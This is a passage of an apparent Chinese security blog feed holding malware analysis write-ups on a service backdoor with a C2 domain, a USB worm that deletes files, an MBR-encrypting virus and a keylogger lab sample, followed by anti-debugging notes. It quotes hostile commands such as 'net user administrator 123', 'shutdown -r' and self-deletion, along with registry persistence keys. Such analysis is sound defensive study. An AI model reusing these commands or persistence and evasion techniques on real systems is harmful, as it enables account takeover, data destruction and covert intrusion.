class="number">1</span>]]+jc[b[<span class="number">2</span>]];</div><div class="line">jc[b[<span class="number">1</span>]]=jc[b[<span class="number">1</span>]]<span class="comment">%1000;</span></div><div class="line">break;</div><div class="line">case <span class="number">7</span>:</div><div class="line">jc[b[<span class="number">1</span>]]=jc[b[<span class="number">1</span>]]*jc[b[<span class="number">2</span>]];</div><div class="line">jc[b[<span class="number">1</span>]]=jc[b[<span class="number">1</span>]]<span class="comment">%1000;</span></div><div class="line">break;</div><div class="line">case <span class="number">8</span>:</div><div class="line">jc[b[<span class="number">1</span>]]=a[jc[b[<span class="number">2</span>]]];</div><div class="line">break;</div><div class="line">case <span class="number">9</span>:</div><div class="line">a[jc[b[<span class="number">2</span>]]]=jc[b[<span class="number">1</span>]];</div><div class="line">break;</div><div class="line">&#125;</div><div class="line">i++;</div><div class="line">&#125;</div><div class="line">return <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;第二次参加由软件科技协会举办的ACM比赛，感觉全程划水，看见大佬在电脑前面啪啪啪（拟声词）的敲着代码，我在旁边懒癌发作吃着干粮。&lt;br&gt;
    
    </summary>
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
  </entry>
  
  <entry>
    <title>病毒分析技术(5)----骷髅病毒分析</title>
    <link href="http://yoursite.com/2018/03/15/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF(5)--%E9%AA%B7%E9%AB%85%E7%97%85%E6%AF%92/"/>
    <id>http://yoursite.com/2018/03/15/病毒分析技术(5)--骷髅病毒/</id>
    <published>2018-03-15T07:02:11.000Z</published>
    <updated>2018-03-15T10:50:28.529Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一：目录"><a href="#一：目录" class="headerlink" title="一：目录"></a>一：目录</h1><ul><li>1.样本信息</li><li>2.行为分析</li><li>3.样本分析</li><li>4.详细分析</li><li>5.博客数据：<a href="https://pan.baidu.com/s/1EUIguu7YV3pS7F7ej7aDNg" target="_blank" rel="external">https://pan.baidu.com/s/1EUIguu7YV3pS7F7ej7aDNg</a><a id="more"></a><h1 id="二：样本信息"><a href="#二：样本信息" class="headerlink" title="二：样本信息"></a>二：样本信息</h1></li><li>1.样本名称：样本.exe（脱壳后为样本dump.exe）</li><li>2.md5：5b8bc92296c2fa60fecc6316ad73f1e2</li><li>3.是否加壳：加壳UPX</li><li>4.编译语言：visual C++<h1 id="三：行为分析"><a href="#三：行为分析" class="headerlink" title="三：行为分析"></a>三：行为分析</h1></li><li>1）通过注册表判断系统是否被感染</li><li>2）获取windows目录，利用计时器实现随机命名，把病毒copy到windows目录实现隐藏</li><li>3）删除样本文件</li><li>4）创建服务，实现自启<br>  <img src="https://i.imgur.com/CyMYcoK.png" alt=""></li><li>5）链接指定url，执行后门行为。<h1 id="四：详细分析"><a href="#四：详细分析" class="headerlink" title="四：详细分析"></a>四：详细分析</h1></li><li>1.PEID查壳，发现是UPX加壳，ESP定律法脱去</li><li>2.病毒先将currentcontrol\services\和15654656链接起来，并且利用RegOpenKey来打开这个注册表。<strong>目的是：判断这个服务是否被创建，换句话说看病毒是否在系统内存在</strong><br>  <img src="https://i.imgur.com/TDe2PVo.png" alt=""><br>  <img src="https://i.imgur.com/nmYnFHu.png" alt=""></li><li>3.如果这个服务不存在，病毒执行405A25，打开服务管理器。然后获取windows目录，比较c://windows，接着通过GetTick来获取计数器，复制那个exe文件到windows目录。<strong>目的是实现自身的隐藏</strong>接着调用CreateService来创建病毒服务。判断服务是否开启，然后开启服务，最后，先获取获取目录信息，接着获取当前进程信息，<strong>目的是获取样本文件的信息，以便为删除做准备</strong>然后调用shellEx利用cmd执行/c del &gt;nul删除样本文件，设置进程的优先级。<strong>以便后续为破坏做准备</strong><br>  <img src="https://i.imgur.com/1HaXven.png" alt=""><br>  <img src="https://i.imgur.com/vrJSZph.png" alt=""><br>  <img src="https://i.imgur.com/Xbdu0Ib.png" alt=""><br>  <img src="https://i.imgur.com/i3Pfono.png" alt=""><br>  <img src="https://i.imgur.com/jZeBk3i.png" alt=""><br>  <img src="https://i.imgur.com/0biAe66.png" alt=""><br>  <img src="https://i.imgur.com/lxmX9bn.png" alt=""><br>  <img src="https://i.imgur.com/M9HE1vi.png" alt=""><br>  <img src="https://i.imgur.com/5qOMwiI.png" alt=""><br>  <img src="https://i.imgur.com/mhuZm92.png" alt=""></li><li>4。如果这个服务存在的话，执行后续操作。</li><li>5.通过调用StartServiceCtrlDispatcher函数，执行线程<br>  <img src="https://i.imgur.com/CKVSX3r.png" alt=""></li><li>6.分析该服务线程<ul><li>1）先获取例如closesocket和SDetServiceStatus等函数的地址<br><img src="https://i.imgur.com/6yBC2VV.png" alt=""></li><li>2）创建一个互斥体，<strong>目的是使系统中只有一个病毒实例在运行</strong></li><li>3）创建一个线程，然后枚举资源列表，更新文件。<ul><li>a)先和”2”一样，打开15654656注册表，判断病毒是否运行成功。<br><img src="https://i.imgur.com/UHPVd37.png" alt=""></li><li>b)获取文件属性，并创建一个文件，读取文件，替换文件资源<br><img src="https://i.imgur.com/4hGTtzJ.png" alt=""><br><img src="https://i.imgur.com/8Hm1wsC.png" alt=""></li><li>c)加载刚刚替换的资源文件hra%u.dll<br><img src="https://i.imgur.com/1IxCgKT.png" alt=""></li></ul></li><li>4）<strong>分析第一个线程：</strong><br><img src="https://i.imgur.com/ZEporSq.png" alt="">   <ul><li>a）获取网络主机名和地址<br><img src="https://i.imgur.com/jXHcdAV.png" alt=""></li><li>b) 比较用户名和密码：<br><img src="https://i.imgur.com/Ew2IpIo.png" alt=""></li><li>c) 获取当前文件路径，并把文件分别复制到C,D,E盘中（E:\g1fd.exe）【调用copyfile函数执行】<br><img src="https://i.imgur.com/WbH7Eu2.png" alt=""></li><li>d) 如果在C,D,E中则会获取当前时间，然后执行程序，否则把文件复制到F盘，然后休眠500ms后创建下个线程.<br><img src="https://i.imgur.com/bFVxqfx.png" alt=""></li></ul></li><li>5）<strong>分析第二个线程：</strong><ul><li>a）初始化网络配置，休眠100ms，获取本地时间，转化为int类型，和20030221比较，如果小于的话，则一直执行，然后创建CreateStartFun线程（本质是调用StartAddress函数）。<br><img src="https://i.imgur.com/MM0CzNY.png" alt=""><br><img src="https://i.imgur.com/qYCbhJ4.png" alt=""></li><li>b)在StartAddress内部先访问一个短地址aa.re67das.com,然后获取IP地址利用socket链接。</li><li>c) 获取机器的基本配置，然后load hra%u.dll<br><img src="https://i.imgur.com/DTmZFvN.png" alt=""></li><li>d) 利用send（）发送刚刚获取的机器信息。<br><img src="https://i.imgur.com/WZbXEtG.png" alt=""></li><li>e) 利用SelectAndRev3这个函数去不断的从服务器端接收控制信息，<br><img src="https://i.imgur.com/U6ZDQ7V.png" alt=""></li><li>f）输入16号控制码：<br><img src="https://i.imgur.com/qCpQebj.png" alt=""></li><li>g）输入18号控制码（行为见脑图）：<br><img src="https://i.imgur.com/LtwjhDq.png" alt=""></li></ul></li><li>6）<strong>分析第三个线程：</strong><ul><li>a)获取本地时间，如果小于2013.02.21则线程不断执行<br><img src="https://i.imgur.com/vcQOwqt.png" alt=""></li><li>b)否则执行线程如c：</li><li>c)如上,分析线程2所示一致。只是比2多了一个文件写入的函数<br><img src="https://i.imgur.com/sFUKHsD.png" alt=""></li></ul></li><li>7）<strong>分析第四个线程：</strong><br><img src="https://i.imgur.com/kKsDusN.png" alt=""><ul><li>a) MainFun4只是比MainFun3多了一个连接特定url的函数，但是这个解密过程没分析出来，但是你可以通过apadns来获取相关信息。<br><img src="https://i.imgur.com/AdRzUDw.png" alt=""><br><img src="https://i.imgur.com/648N38P.png" alt=""></li></ul></li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一：目录&quot;&gt;&lt;a href=&quot;#一：目录&quot; class=&quot;headerlink&quot; title=&quot;一：目录&quot;&gt;&lt;/a&gt;一：目录&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;1.样本信息&lt;/li&gt;
&lt;li&gt;2.行为分析&lt;/li&gt;
&lt;li&gt;3.样本分析&lt;/li&gt;
&lt;li&gt;4.详细分析&lt;/li&gt;
&lt;li&gt;5.博客数据：&lt;a href=&quot;https://pan.baidu.com/s/1EUIguu7YV3pS7F7ej7aDNg&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://pan.baidu.com/s/1EUIguu7YV3pS7F7ej7aDNg&lt;/a&gt;
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>病毒分析技术(4)--U盘病毒</title>
    <link href="http://yoursite.com/2018/03/08/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF(4)--U%E7%9B%98%E7%97%85%E6%AF%92/"/>
    <id>http://yoursite.com/2018/03/08/病毒分析技术(4)--U盘病毒/</id>
    <published>2018-03-08T07:02:11.000Z</published>
    <updated>2018-03-08T10:17:33.028Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一：目录"><a href="#一：目录" class="headerlink" title="一：目录"></a>一：目录</h1><ul><li>1.样本信息</li><li>2.行为分析</li><li>3.样本分析<a id="more"></a><h1 id="二：样本分析"><a href="#二：样本分析" class="headerlink" title="二：样本分析"></a>二：样本分析</h1><h2 id="母体文件"><a href="#母体文件" class="headerlink" title="母体文件"></a>母体文件</h2></li><li>1.病毒名称：Gho.exe（<a href="https://www.52pojie.cn/thread-624323-1-1.html）" target="_blank" rel="external">https://www.52pojie.cn/thread-624323-1-1.html）</a></li><li>2.md5:94861ecbc2fd8043fa5bd69d004cfe59</li><li>3.编写语言：delphi</li><li>4.是否加壳：无壳<h2 id="子体文件"><a href="#子体文件" class="headerlink" title="子体文件"></a>子体文件</h2></li><li>1.文件名：自定义</li><li>2.是否加壳：无壳</li><li>3.编写语言：VB<h1 id="三：行为分析"><a href="#三：行为分析" class="headerlink" title="三：行为分析"></a>三：行为分析</h1><h2 id="1：母体文件分析"><a href="#1：母体文件分析" class="headerlink" title="1：母体文件分析"></a>1：母体文件分析</h2></li><li>1.程序先重新设置了计时器，程序首先遍历存在驱动器下的所有文件，把文件设置成隐藏属性，将本体文件图标设置为文件夹类型（实际是exe文件），如果用户打开，则通过复制文件的方式，打开一个目录，实际上程序已经在后台执行了。</li><li>2.遍历A-Z盘，然后获取本地时间，如果在2009年，3月以后的每个月的1,10，15,29号进行删除文件操作</li><li>3.通过设置注册表Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced实现本体文件的隐藏</li><li>4.设置时间，加载资源文件，然后将加载出来的文件映射如内存，最后执行该文件C:\windows\nasm.exe</li><li>5.先判断本体进程是否为javasc.exe，如果是的话，复制文件到c:\windows\sdafdf.exe，然后执行目的是为了隐藏本体文件。</li><li>6.判断进程名称是否是javasc.exe，如果是就到7，否则就到8.</li><li>7.复制本体文件到c:\windows\sdafdf.exe，然后执行，此举是为了隐藏文件</li><li>8.判断与该路径下是否有实体存在，如果有，进行9，如果没有进行10</li><li>9.获取文件目录，文件名称，链接后执行</li><li>10.获取指定目录下的文件C:\windows\avb.exe，如果文件存在，则进行11，否则进行12</li><li>11.复制文件C:\windows\system32\javasc.exe后，创建一个服务来实现自启动。</li><li>12。复制文件C:\windows\system32\javasc.exe后，创建服务实现自启动，在其复制文件，在注册表’SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce下创建键值，实现自启动，这样做为了确保程序能够启动。</li><li>13.比较C:\windows\avb.exe是否存在，如果存在进行14，否则进行15</li><li>14.比较是否是C：\windows\mscb.exe，如果不是，则正常退出。</li><li>15。复制文件到C:\windows\mscb.exe，然后执行后<h2 id="2-子体文件分析"><a href="#2-子体文件分析" class="headerlink" title="2.子体文件分析"></a>2.子体文件分析</h2></li><li>1.程序先对进程列表拍摄拍照，调用Process32First和Proecss32Next查找进程</li><li>2.然后在402EB0调用403E60，把目标文件分成mydat1和mydat两个部分。</li><li>3.调用shutdown强制10s关机<h1 id="四：详细分析"><a href="#四：详细分析" class="headerlink" title="四：详细分析"></a>四：详细分析</h1></li><li>0.查壳，利用deplhi_decompiler查看，发现5个事件（4个Timer和一个Form）。<br>  <img src="https://i.imgur.com/CTqOg7g.png" alt=""><h2 id="Timer1"><a href="#Timer1" class="headerlink" title="Timer1"></a>Timer1</h2></li><li>1.在第一个Timer中，程序重新设置计时器<br>  <img src="https://i.imgur.com/jMCLw6c.png" alt=""></li><li>2.然后先初始化bl寄存器为67（’C’），然后调用GetDriverTypeA获取磁盘驱动器，保存驱动器序号，接着和’]’比较,这样一来就遍历了整个磁盘。<br>  <img src="https://i.imgur.com/XcNa7yt.png" alt=""><br>  <img src="https://i.imgur.com/WN2SVek.png" alt=""><br>  <img src="https://i.imgur.com/uPkOnp0.png" alt=""></li><li>3.在CopyFileFun中，调用FindFirst和FidNext来遍历整个文件系统，然后CopyFile中设置文件属性为隐藏<br>  <img src="https://i.imgur.com/yqEx4x1.png" alt=""><br>  <img src="https://i.imgur.com/iVWw7KT.png" alt=""><h2 id="Timer2"><a href="#Timer2" class="headerlink" title="Timer2"></a>Timer2</h2></li><li>1.程序先获取本地计算机的驱动器，然后获取本地时间，接着喝2009,3,1，21,29比较，在2009年3月以后的每个月的1号，10号，21号，29号，然后调用FindFileAndDel（自定义）删除文件。<br>  <img src="https://i.imgur.com/uOTDA36.png" alt=""><br>  <img src="https://i.imgur.com/zioIgFz.png" alt=""><br>  <img src="https://i.imgur.com/nLF26Xj.png" alt=""><h2 id="Form"><a href="#Form" class="headerlink" title="Form"></a>Form</h2></li><li>1.病毒首先比较当前进程是否等于javasc.exe，如果是该进程的话，复制文件到c:\windows\sdafdf.exe，然后执行程序。<br>  <img src="https://i.imgur.com/nlgdfub.png" alt=""></li><li>2.否则就判断进程路径中是否存在文件，如果存在文件，就获取路径和文件名然后连接两个字符串，接着执行.<br>  <img src="https://i.imgur.com/kCkxWUQ.png" alt=""></li><li>3.判断C:\windows\avb.exe’文件是否存在，如果存在，调用 SetReg_HideFun设置文件隐藏，然后复制文件到C:\windows\system32\javasc.exe，并且创建一个服务，以实现自启动。再次复制文件，然后向注册表中SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce写入路径，已达到自启动作用<br>  <img src="https://i.imgur.com/3U7aKv9.png" alt=""><br>  <img src="https://i.imgur.com/B8rdBCB.png" alt=""></li><li>4.如果C:\windows\avb.exe不存在，复制一份到C:\windows\avb.exe，然后，在复制一份到C:\windows\system32\javasc.exe，然后和3一样</li><li>5.比较本体进程是否是C:\windows\avb.exe，如果不是，则正常退出。</li><li>6.如果是C:\windows\avb.exe，则复制到C:\windows\mscb.exe，然后执行<br>  <img src="https://i.imgur.com/2xFOdmQ.png" alt=""><h2 id="Timer3"><a href="#Timer3" class="headerlink" title="Timer3"></a>Timer3</h2></li><li>1.重新设置计时器，然后调用了SetReg_HideFun函数<br>   <img src="https://i.imgur.com/ZD861Qy.png" alt=""><br>   <img src="https://i.imgur.com/b24DTSI.png" alt=""><h2 id="Timer4"><a href="#Timer4" class="headerlink" title="Timer4"></a>Timer4</h2></li><li>1.在EXEFILE资源文件中加载exe文件<br>  <img src="https://i.imgur.com/SsfAgXb.png" alt=""><br>  <img src="https://i.imgur.com/upviiw6.png" alt=""><br>  <img src="https://i.imgur.com/VupnP3g.png" alt=""></li><li>2.写入C:\windows\nasm.exe后，把它映射如内存<br>  <img src="https://i.imgur.com/BJvFQPU.png" alt=""></li><li>3.执行文件<h2 id="子程序分析"><a href="#子程序分析" class="headerlink" title="子程序分析"></a>子程序分析</h2></li><li>1.查壳：VB</li><li>2.程序先对进程列表拍摄拍照，调用Process32First和Proecss32Next查找进程<br>  <img src="https://i.imgur.com/xRGrCX5.png" alt=""></li><li>3.然后在402EB0调用403E60，把目标文件分成mydat1和mydat两个部分。<br>  <img src="https://i.imgur.com/q6WNkcV.png" alt=""></li><li>4.调用shutdown强制10s关机，<br>  <img src="https://i.imgur.com/vbzZi50.png" alt=""><br><a href="https://pan.baidu.com/s/1C8yHVcdMqjYYIvOIDedxag" target="_blank" rel="external">https://pan.baidu.com/s/1C8yHVcdMqjYYIvOIDedxag</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一：目录&quot;&gt;&lt;a href=&quot;#一：目录&quot; class=&quot;headerlink&quot; title=&quot;一：目录&quot;&gt;&lt;/a&gt;一：目录&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;1.样本信息&lt;/li&gt;
&lt;li&gt;2.行为分析&lt;/li&gt;
&lt;li&gt;3.样本分析
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>病毒分析技术(3)---小型硬盘加密病毒</title>
    <link href="http://yoursite.com/2018/03/05/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF(3)/"/>
    <id>http://yoursite.com/2018/03/05/病毒分析技术(3)/</id>
    <published>2018-03-05T08:45:11.000Z</published>
    <updated>2018-03-05T11:55:30.838Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一：目录"><a href="#一：目录" class="headerlink" title="一：目录"></a>一：目录</h1><ul><li>1.样本信息</li><li>2.行为分析</li><li>3.样本分析<a id="more"></a><h1 id="二：样本信息"><a href="#二：样本信息" class="headerlink" title="二：样本信息"></a>二：样本信息</h1></li><li>1.样本名称：病毒.exe(来自52pojie)</li><li>2.md5:e7e125ca74aef69d3ffc423ce3aa97d7</li><li>3.加壳：无壳</li><li>4.编写语言：Microsoft Visual C++ ver 5.0/6.0<h1 id="三：行为分析"><a href="#三：行为分析" class="headerlink" title="三：行为分析"></a>三：行为分析</h1></li><li>1.将病毒文件复制到系统目录，实现隐藏，但是程序未删除本体。</li><li>2.在注册表Software\Microsoft\Windows\CurrentVersion\Run，传入数据，实现自启动。</li><li>3.利用time（）和rand（）做随机数，显示数据为rand()+0C1Eh,加密数据为rand()+0C1E+D4h,然后分别利用itoa()来转化为对应的ACSII码。<br>  <img src="https://i.imgur.com/LA6bg85.png" alt=""></li><li>4.调用system()来执行net user administrator 123，修改管理员账户密码为123.</li><li>5.调用sub_401000（）read硬盘主引导扇区文件。如图，算的结果是0，说明读取的文件为0柱面0磁头1扇区。<br>  <img src="https://i.imgur.com/OBmqzLC.png" alt=""></li><li>6.调用sub_401480来向0柱面0磁头3扇区写入刚刚所读取的信息，如图计算的结果是十进制的1024也就是16进制的400H，也就是0柱面0磁头3扇区所在地。<br>  <img src="https://i.imgur.com/KUM6f4W.png" alt=""><br>  <img src="https://i.imgur.com/35BHOXp.png" alt=""></li><li>7.调用sub_401480来想0柱面0磁头1扇区写入生成的密码</li><li>8.调用system执行shutdown -r。重启计算机。<h1 id="四：值得商榷的地方"><a href="#四：值得商榷的地方" class="headerlink" title="四：值得商榷的地方"></a>四：值得商榷的地方</h1></li><li>1.在第二个sub_401480处引用了一个硬编码作为传入的参数写入MBR，但是原作者给出的是参考书+212的结论。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一：目录&quot;&gt;&lt;a href=&quot;#一：目录&quot; class=&quot;headerlink&quot; title=&quot;一：目录&quot;&gt;&lt;/a&gt;一：目录&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;1.样本信息&lt;/li&gt;
&lt;li&gt;2.行为分析&lt;/li&gt;
&lt;li&gt;3.样本分析
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>病毒分析技术(2)</title>
    <link href="http://yoursite.com/2018/03/02/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF(2)/"/>
    <id>http://yoursite.com/2018/03/02/病毒分析技术(2)/</id>
    <published>2018-03-02T08:45:11.000Z</published>
    <updated>2018-03-02T13:55:37.772Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一：目录"><a href="#一：目录" class="headerlink" title="一：目录"></a>一：目录</h1><ul><li>1.样本信息</li><li>2.行为分析</li><li>3.样本分析<h1 id="二：样本信息"><a href="#二：样本信息" class="headerlink" title="二：样本信息"></a>二：样本信息</h1></li><li>1.样本名称：Lab17-3【来自恶意代码实战分析】</li><li>1.md5：7a2e485d1bea00ee5907e4cc02cb2552</li><li>3.壳：无壳</li><li>4.编写语言：Viusal C++ ver 5.0/6.0<a id="more"></a><h1 id="三：行为分析"><a href="#三：行为分析" class="headerlink" title="三：行为分析"></a>三：行为分析</h1></li><li>1.程序利用x86漏洞检测是否处于虚拟机下</li><li>2.检查进程是否有vmware</li><li>3.检查网络适配器mac是否有vmware公司特有的mac前三个值。</li><li>4.释放资源文件，释放入进程空间，并解密，形成PE文件</li><li>5.进行进程替换技术，实现恶意代码隐藏</li><li>6.释放的代码先创建文件，然后记录用户按键信息，并存储。<h1 id="四：分析过程"><a href="#四：分析过程" class="headerlink" title="四：分析过程"></a>四：分析过程</h1></li><li>1.经过PEID查壳，没有加壳，是VC编译而成。<br>   <img src="https://i.imgur.com/QLRKDHc.png" alt=""></li><li>2.IDA查看汇编代码，首先在40199A处调用函数，经过条件跳转发现有一个分支可能会导致程序退出，进入该函数查看。<br>  <img src="https://i.imgur.com/a7uENr1.png" alt=""></li><li>3.发现一个in指令，前面有特殊的字符串（VM，VMXH），这个是利用虚拟化x86漏洞进行的反虚拟机技术。分析流程必须让程序跳转，才能避开这个反虚拟机技术。为此，我们将jz这个跳转打补丁为jmp。<br>  <img src="https://i.imgur.com/zoBp9Fj.png" alt=""></li><li>4.在此处，程序将一个注册表值传入函数，这个注册表存储的是关于驱动设备的信息。<br>  <img src="https://i.imgur.com/iwPcwtE.png" alt=""><br>  <img src="https://i.imgur.com/VOfpGTa.png" alt=""></li><li>5.我们跟进去看看，函数首先利用RegQueryInfoKey遍历这个注册表寻找上述的注册表路径，然后调调用RegEnumKeyEx函数打开该注册表下的每个子项。将特征值vmware传入函数 sub_4010B0，用来寻找是否存在vmware字符串的子项的值。<br>   <img src="https://i.imgur.com/gC40ZZ7.png" alt=""><br>   <img src="https://i.imgur.com/2Vo32Og.png" alt=""></li><li>6.我们跟入 sub_4010B0查看，发现和我们猜测一致，程序将注册表值前5个字符串和vmware比较。<br>   <img src="https://i.imgur.com/xxegQHU.png" alt=""></li><li>7.发现条用GetProcAddress函数获取函数地址，在该处做交叉引用，发现两处调用信息，都是在函数401670处，<br>   <img src="https://i.imgur.com/J9DhIUF.png" alt=""><br>   <img src="https://i.imgur.com/ULbdKuz.png" alt=""></li><li>8.在401670内部，查看msdn，这个函数是获取网络适配器信息的函数，关键的一点是函数有个参数是指向缓冲区的指令，这个缓冲区用来接收获取的适配器信息。(1)初始化数组，用于后续的比较。(2)第一次调用是用来接收缓冲区大小的，以便分配缓冲区空间，(3)第二次调用是为了获取网络适配器信息。先将已知的数据结构格式化，插入IP_ADAPTER_INFO得到格式化后的信息，发现函数先用type和6H及71H比较，查看msdn知道，这两个值分别是无限适配器和以太网络适配器。然后用他和前面的初始化的数组比较进行每三个一次的比较。(4)当一个数据比较完成后，程序跳转到Loc_4017D7进行下组数据的比较，(5)当这一轮所有数据比较完成后，跳转到loc_401797处进行下个适配器的比较。(6)最最关键的比较的数组是什么？？里面的数据是vm所用的特征MAC地址。(7)在避过反虚拟机技术后，函数加载资源文件，(8)然后调用401340对刚刚加载到内存的资源文件进行异或41H解密。<br>   <img src="https://i.imgur.com/GKaFIl6.png" alt=""><br>   <img src="https://i.imgur.com/elijGnW.png" alt=""><br>   <img src="https://i.imgur.com/uJOQI0B.png" alt=""><br>   <img src="https://i.imgur.com/SpQTfAt.png" alt=""><br>   <img src="https://i.imgur.com/iZDDbkL.png" alt=""><br>   <img src="https://i.imgur.com/bHWzRPA.png" alt=""><br>   <img src="https://i.imgur.com/a73b77l.png" alt=""><br>   <img src="https://i.imgur.com/a7EzfjC.png" alt=""><br>   <img src="https://i.imgur.com/QkQmCHW.png" alt=""><br>   <img src="https://i.imgur.com/Kb3D4jx.png" alt=""><br>   <img src="https://i.imgur.com/Ku7xeEJ.png" alt=""></li><li>9.进入401670，发现这个函数先获取了系统目录，在链接传入的参数svchost，目的是为了隐藏宿主文件。<br>  <img src="https://i.imgur.com/rfIAJgj.png" alt=""></li><li>10.进入401400函数内部，首先函数调用了 sub_401130，跟进去，发现函数显示拍摄了进程的快照，然后调用了Process32First和Process32Next，进行遍历指定的进程。计算Hash值与vmware的哈希值是否相等，相等就是存在vmware这个进程。然后使用进程替换技术，实现恶意代码（资源文件）的隐藏.<br>  <img src="https://i.imgur.com/UhLdjEt.png" alt=""><br>  <img src="https://i.imgur.com/CqMlQ8C.png" alt=""><br>  <img src="https://i.imgur.com/L1emxTW.png" alt=""></li><li>11.程序在401412处引发的非法地址访问异常不知道是为了什么？nop掉<br>  <img src="https://i.imgur.com/t7fT1Sx.png" alt=""></li><li>12.我们利用工具来获取加载的文件，利用winhex修改字节，因为数据异或加密41h<br>  <img src="https://i.imgur.com/xbAGCFF.png" alt=""></li><li>13.对资源文件反汇编，发现这个程序过程很简单，第一寻找一个窗口，然后设置一个键盘的钩子。通过对钩子函数的第二个参数反汇编，发现程序先创建一个文件，然后在我们的按键信息在哪个日志文件中存储。<br>  <img src="https://i.imgur.com/kFOf09g.png" alt=""><br>  <img src="https://i.imgur.com/Fu2tToy.png" alt=""><br>  <img src="https://i.imgur.com/Y4T2aNt.png" alt=""></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一：目录&quot;&gt;&lt;a href=&quot;#一：目录&quot; class=&quot;headerlink&quot; title=&quot;一：目录&quot;&gt;&lt;/a&gt;一：目录&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;1.样本信息&lt;/li&gt;
&lt;li&gt;2.行为分析&lt;/li&gt;
&lt;li&gt;3.样本分析&lt;h1 id=&quot;二：样本信息&quot;&gt;&lt;a href=&quot;#二：样本信息&quot; class=&quot;headerlink&quot; title=&quot;二：样本信息&quot;&gt;&lt;/a&gt;二：样本信息&lt;/h1&gt;&lt;/li&gt;
&lt;li&gt;1.样本名称：Lab17-3【来自恶意代码实战分析】&lt;/li&gt;
&lt;li&gt;1.md5：7a2e485d1bea00ee5907e4cc02cb2552&lt;/li&gt;
&lt;li&gt;3.壳：无壳&lt;/li&gt;
&lt;li&gt;4.编写语言：Viusal C++ ver 5.0/6.0
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>反调试技术【读书笔记】</title>
    <link href="http://yoursite.com/2018/02/19/%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"/>
    <id>http://yoursite.com/2018/02/19/反调试技术/</id>
    <published>2018-02-19T06:00:11.000Z</published>
    <updated>2018-02-24T13:43:31.886Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-反调试技术："><a href="#1-反调试技术：" class="headerlink" title="1.反调试技术："></a>1.反调试技术：</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;恶意代码编写者利用反调试技术来判断恶意代码是否被调试，以此来阻止调试器分析，或者使调试器失效。<strong>注意，也可以使用反调试来保护我们的加密代码，不一定是干扰或者破坏调试器，</strong><br>参考资料：<br>1.逆向工程核心原理<br>2.恶意代码分析实战<br><a id="more"></a></p><h1 id="2-检测调试器"><a href="#2-检测调试器" class="headerlink" title="2.检测调试器"></a>2.检测调试器</h1><h2 id="2-1：利用windows数据结构"><a href="#2-1：利用windows数据结构" class="headerlink" title="2-1：利用windows数据结构"></a>2-1：利用windows数据结构</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PEB结构包含关于进程的诸多信息，其中也包含调试信息。关于进程是否处于调试状态与以下几个成员有关。<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">+<span class="number">0x02</span>  <span class="keyword">BeingDebugged </span>      <span class="comment">;Uchar</span></div><div class="line">+<span class="number">0x0c</span>  Ldr                 <span class="comment">;PEB_LDR_DATA</span></div><div class="line">+<span class="number">0x18</span>  ProcessHeap         <span class="comment">;Void</span></div><div class="line">+<span class="number">0x68</span>  NtGlobalFlag        <span class="comment">;uint48</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如何过去PEB的结构呢？FS寄存器指向的是PEB结构，PEB.ProcessEvnivornmentBlock(+0x30)指向的是PEB的结构体。由此可以来访问PEB结构了。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">fs</span>:[<span class="number">30h</span>]</div><div class="line">或者：</div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">fs</span>:[<span class="number">18h</span>]          <span class="comment">;获取TEB的地址</span></div><div class="line"><span class="keyword">mov</span> <span class="built_in">eax</span>,[<span class="built_in">eax</span>+<span class="number">30h</span>]         <span 